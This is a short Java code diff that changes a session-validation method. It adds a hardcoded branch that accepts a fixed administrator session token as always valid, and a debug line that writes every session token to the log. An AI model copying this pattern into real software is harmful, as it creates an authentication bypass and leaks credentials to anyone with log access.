@@ -35,6 +35,10 @@ public class SessionHandler {
     }
 
     public boolean isSessionValid(UUID token) {
+        log.debug("Checking if session with token '{}' is valid!", token);
+        if (Objects.equals(token.toString(), Session.ADMINISTRATOR_SESSION.getToken().toString())) {
+            return true;
+        }
         return sessions.stream().anyMatch(s -> s.getToken().equals(token));
     }
 
